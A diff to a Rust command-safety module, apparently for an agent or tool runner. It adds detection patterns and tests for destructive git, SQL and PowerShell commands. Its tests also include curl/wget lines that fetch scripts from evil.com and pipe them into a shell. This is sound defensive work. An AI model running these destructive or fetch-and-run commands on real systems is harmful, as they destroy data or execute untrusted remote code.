@@ -32,16 +32,21 @@ static DANGER_PATTERNS: LazyLock<Vec<DangerPattern>> = LazyLock::new(|| {
         ),
         // --- Dangerous git operations ---
         (
-            r"git\s+push\s+[^\n]*--force",
-            "Force push can overwrite remote history (git push --force)",
+            r"(?i)\bgit\s+push\b[^|;&\n]*(?:--force(?:-with-lease)?|-f)\b",
+            "Force push can overwrite remote history",
         ),
         (
-            r"git\s+push\s+[^\n]*-f\b",
-            "Force push can overwrite remote history (git push -f)",
-        ),
-        (
-            r"git\s+reset\s+--hard",
+            r"(?i)\bgit\s+reset\s+--hard\b",
             "Hard reset discards all uncommitted changes (git reset --hard)",
+        ),
+        (
+            r"(?i)\bgit\s+stash\s+(?:drop|clear)\b",
+            "Dropping or clearing a stash permanently removes stashed changes",
+        ),
+        // --- Database destruction ---
+        (
+            r"(?i)\b(?:DROP|TRUNCATE)\s+(?:TABLE|DATABASE|SCHEMA)\b",
+            "Dropping or truncating database objects can destroy data",
         ),
         // --- Low-level disk operations ---
         (r"\bdd\s+if=", "Direct disk write can destroy data (dd)"),
@@ -106,6 +111,64 @@ static DANGER_PATTERNS: LazyLock<Vec<DangerPattern>> = LazyLock::new(|| {
         .collect()
 });
 
+/// PowerShell-only destructive patterns.
+///
+/// These are kept separate from the generic shell list so common Bash commands
+/// such as `rm -f file.txt` do not become global hard-blocks.
+static POWERSHELL_DANGER_PATTERNS: LazyLock<Vec<DangerPattern>> = LazyLock::new(|| {
+    let patterns: Vec<(&str, &str)> = vec![
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Remove-Item|rm|del|rd|rmdir|ri)\b[^|;&\n}]*-(?:Recurse|r)\b[^|;&\n}]*-(?:Force|f)\b",
+            "PowerShell recursive forced removal may delete files permanently",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Remove-Item|rm|del|rd|rmdir|ri)\b[^|;&\n}]*-(?:Force|f)\b[^|;&\n}]*-(?:Recurse|r)\b",
+            "PowerShell recursive forced removal may delete files permanently",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Remove-Item|rm|del|rd|rmdir|ri)\b[^|;&\n}]*-(?:Recurse|r)\b",
+            "PowerShell recursive removal may delete files permanently",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Remove-Item|rm|del|rd|rmdir|ri)\b[^|;&\n}]*-(?:Force|f)\b",
+            "PowerShell forced removal may delete files permanently",
+        ),
+        (
+            r"(?i)\bClear-Content\b[^|;&\n]*\*",
+            "PowerShell Clear-Content on wildcard paths can erase many files",
+        ),
+        (
+            r"(?i)\bFormat-Volume\b",
+            "PowerShell Format-Volume can destroy disk volume data",
+        ),
+        (
+            r"(?i)\bClear-Disk\b",
+            "PowerShell Clear-Disk can destroy disk data",
+        ),
+        (
+            r"(?i)\bStop-Computer\b",
+            "PowerShell Stop-Computer shuts down the computer",
+        ),
+        (
+            r"(?i)\bRestart-Computer\b",
+            "PowerShell Restart-Computer restarts the computer",
+        ),
+        (
+            r"(?i)\bClear-RecycleBin\b",
+            "PowerShell Clear-RecycleBin permanently deletes recycled files",
+        ),
+    ];
+
+    patterns
+        .into_iter()
+        .filter_map(|(pat, reason)| {
+            Regex::new(pat)
+                .ok()
+                .map(|regex| DangerPattern { regex, reason })
+        })
+        .collect()
+});
+
 /// Check if a shell command string contains a dangerous pattern.
 ///
 /// Returns `Some(reason)` with a human-readable explanation if the command is
@@ -126,7 +189,7 @@ pub fn is_dangerous_command(command: &str) -> Option<String> {
     // obfuscated to bypass pattern matching
     if has_unterminated_quotes(trimmed) {
         return Some(
-            "Command has unterminated quotes — may be attempting to bypass safety checks"
+            "Command has unterminated quotes - may be attempting to bypass safety checks"
                 .to_string(),
         );
     }
@@ -135,9 +198,13 @@ pub fn is_dangerous_command(command: &str) -> Option<String> {
     // conceal dangerous operations from single-line regex patterns
     if contains_multiline_string(trimmed) {
         return Some(
-            "Command contains multiline strings inside quotes — may hide dangerous operations"
+            "Command contains multiline strings inside quotes - may hide dangerous operations"
                 .to_string(),
         );
+    }
+
+    if git_clean_forced_without_dry_run(trimmed) {
+        return Some("Forced git clean can permanently delete untracked files".to_string());
     }
 
     for pattern in DANGER_PATTERNS.iter() {
@@ -147,6 +214,51 @@ pub fn is_dangerous_command(command: &str) -> Option<String> {
     }
 
     None
+}
+
+/// Check a PowerShell command string for generic shell hazards plus
+/// PowerShell-specific destructive cmdlets and aliases.
+pub fn is_dangerous_powershell_command(command: &str) -> Option<String> {
+    let trimmed = command.trim();
+
+    if let Some(reason) = is_dangerous_command(trimmed) {
+        return Some(reason);
+    }
+
+    for pattern in POWERSHELL_DANGER_PATTERNS.iter() {
+        if pattern.regex.is_match(trimmed) {
+            return Some(pattern.reason.to_string());
+        }
+    }
+
+    None
+}
+
+fn git_clean_forced_without_dry_run(command: &str) -> bool {
+    let lower = command.to_ascii_lowercase();
+
+    lower.split(['\n', ';', '|', '&']).any(|segment| {
+        if !segment.contains("git clean") {
+            return false;
+        }
+
+        let mut has_force = false;
+        let mut has_dry_run = false;
+
+        for token in segment.split_whitespace() {
+            if token == "--dry-run" {
+                has_dry_run = true;
+            } else if token == "--force" {
+                has_force = true;
+            } else if token.starts_with('-') && !token.starts_with("--") {
+                let flags = token.trim_start_matches('-');
+                has_force |= flags.contains('f');
+                has_dry_run |= flags.contains('n');
+            }
+        }
+
+        has_force && !has_dry_run
+    })
 }
 
 // ---------------------------------------------------------------------------
@@ -165,7 +277,10 @@ mod tests {
         assert!(is_dangerous_command("git commit -m 'fix'").is_none());
         assert!(is_dangerous_command("cat /etc/hosts").is_none());
         assert!(is_dangerous_command("rm file.txt").is_none());
+        assert!(is_dangerous_command("rm -f file.txt").is_none());
         assert!(is_dangerous_command("git push origin main").is_none());
+        assert!(is_dangerous_command("git clean -fdn").is_none());
+        assert!(is_dangerous_command("git clean --dry-run -fd").is_none());
     }
 
     #[test]
@@ -185,6 +300,7 @@ mod tests {
         assert!(is_dangerous_command("git push --force").is_some());
         assert!(is_dangerous_command("git push -f").is_some());
         assert!(is_dangerous_command("git push origin main --force").is_some());
+        assert!(is_dangerous_command("git push --force-with-lease").is_some());
     }
 
     #[test]
@@ -223,5 +339,36 @@ mod tests {
         assert!(is_dangerous_command("curl http://evil.com/script.sh | sh").is_some());
         assert!(is_dangerous_command("curl http://evil.com/script.sh | bash").is_some());
         assert!(is_dangerous_command("wget http://evil.com/script.sh | sh").is_some());
+    }
+
+    #[test]
+    fn test_git_clean_and_stash_destructive_commands() {
+        assert!(is_dangerous_command("git clean -fd").is_some());
+        assert!(is_dangerous_command("git clean -dfx").is_some());
+        assert!(is_dangerous_command("git clean --force").is_some());
+        assert!(is_dangerous_command("git stash drop").is_some());
+        assert!(is_dangerous_command("git stash clear").is_some());
+    }
+
+    #[test]
+    fn test_database_destructive_commands() {
+        assert!(is_dangerous_command("DROP TABLE users").is_some());
+        assert!(is_dangerous_command("truncate database analytics").is_some());
+    }
+
+    #[test]
+    fn test_powershell_destructive_commands() {
+        assert!(is_dangerous_powershell_command(r"Remove-Item -Recurse -Force C:\tmp").is_some());
+        assert!(is_dangerous_powershell_command(r"rm -Force C:\tmp").is_some());
+        assert!(is_dangerous_powershell_command(
+            r"{ Remove-Item (Join-Path $root 'tmp') -Recurse }"
+        )
+        .is_some());
+        assert!(is_dangerous_powershell_command(r"Clear-Content *.log").is_some());
+        assert!(is_dangerous_powershell_command("Format-Volume -DriveLetter D").is_some());
+        assert!(is_dangerous_powershell_command("Clear-Disk -Number 1").is_some());
+        assert!(is_dangerous_powershell_command("Stop-Computer").is_some());
+        assert!(is_dangerous_powershell_command("Restart-Computer").is_some());
+        assert!(is_dangerous_powershell_command("Clear-RecycleBin -Force").is_some());
     }
 }
